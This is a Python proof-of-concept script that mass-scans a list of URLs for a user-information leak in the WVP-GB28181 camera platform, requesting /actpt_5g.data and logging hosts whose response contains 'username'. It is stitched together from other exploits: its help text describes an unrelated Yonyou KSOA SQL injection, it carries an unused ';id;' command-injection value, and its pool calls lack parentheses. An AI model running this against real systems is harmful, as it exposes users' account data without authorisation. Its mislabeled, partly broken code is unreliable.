#WVP-GB28181摄像头管理平台存在的用户信息泄露漏洞
import requests,sys,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help="Please input -h")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for url in fp.readlines():
                lis.append(url.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join

    # print("Usage：python "+sys.argv[0]+' -h')



def poc(target):
    
    payload = '/actpt_5g.data'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36'
    }
    proxy = {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
    }
    data = {
        "opid":"1","name":";id;","type":"rest"
    }
    try:
        res1 = requests.get(url = target+payload,headers=headers,proxies=proxy,timeout=5,verify=False)
        if 'username' in res1.text:
            print(target)
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()